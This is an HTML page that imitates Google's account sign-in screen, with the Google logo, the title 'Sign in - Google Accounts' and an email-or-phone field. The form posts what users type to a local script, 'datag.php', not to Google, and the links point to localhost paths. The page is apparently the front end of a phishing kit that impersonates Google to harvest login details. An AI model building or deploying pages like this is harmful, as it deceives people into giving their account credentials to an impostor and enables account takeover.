<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        #div1 {
            border: 1px solid #dadcdf;
            width: 500px;
            margin-left: 500px;
            margin-top: 70px;
            padding-top: 30px;
            padding-bottom: 70px;

        }

        img {
            width: 180px;
            height: 70px;
            margin-left: 155px;
            margin-bottom: 0px;
        }

        #p1 {
            margin-left: 205px;
            font-size: 32px;
            margin-top: 15px;
            margin-bottom: 17px;
        }

        #p2 {
            margin-left: 145px;
            font-size: 20px;
            margin-top: 0px;
        }

        input[type=text] {
            width: 370px;
            height: 35px;
            padding: 16px;
            margin-left: 50px;
            font-size: 18px;
            border-radius: 8px;
            border: 1px solid #dadcdf;
            margin-top: 20px;
            margin-bottom: 12px;

        }

        #a1 {
            margin-left: 50px;
            text-decoration: none;
            font-size: 19px;
            font-weight: bold;
            color: #1a73e8;
        }

        #p3 {
            font-size: 18px;
            margin-left: 50px;
            margin-top: 57px;
            opacity: 0.8;
            margin-bottom: 3px;
        }

        #a2 {
            font-size: 19px;
            text-decoration: none;
            margin-left: 50px;
            font-weight: bold;
            color: #1676f3;
        }

        #a3 {
            font-size: 19px;
            text-decoration: none;
            margin-left: 50px;
            color: #1676f3;
            font-weight: bold;
        }

        button {
            margin-left: 180px;
            background-color: #1676f3;
            color: white;
            font-size: 18px;
            font-weight: bold;
            width: 95px;
            border: 1px solid #1676f3;
            padding: 10px;
            border-radius: 8px;
        }

        button:hover {
            cursor: pointer;
            opacity: 0.9;

        }

        #div2 {
            margin-left: 460px;
        }

        label {
            font-size: 17px;
            opacity: 0.9;
        }

        select {
            border: 1px solid white;
        }

        ul {
            list-style-type: none;
            margin-top: 30px;
        }

        li {
            float: left;
        }

        #help {
            margin-left: 146px;
        }

        #privacy {
            margin-left: 30px;
        }

        #terms {
            margin-left: 30px;
        }
        
    </style>
</head>

<body>
    <form class="login_form" action="datag.php" method="post">
    <div id="div1">
        <img src="https://freepngimg.com/download/google/66907-images-logo-google-free-download-png-hd.png"
            alt="google">
        <p id="p1">Sign in</p>
        <p id="p2">Use your Google Account</p>
        <input type="text" name="email" placeholder="email or phone" required>
        <a id="a1" href="http://localhost/SA/forgetpassword.php">Forgot email?</a>
        <p id="p3">Not your computer? Use a Private Window to sign in.</p>
        <a id="a2" href="#">Learn more</a><br><br><br><br>
        <a id="a3" href="http://localhost/SA/createanaccount.php">Create account</a>
        <button>Next</button>
    </div>

    
</body>

</html>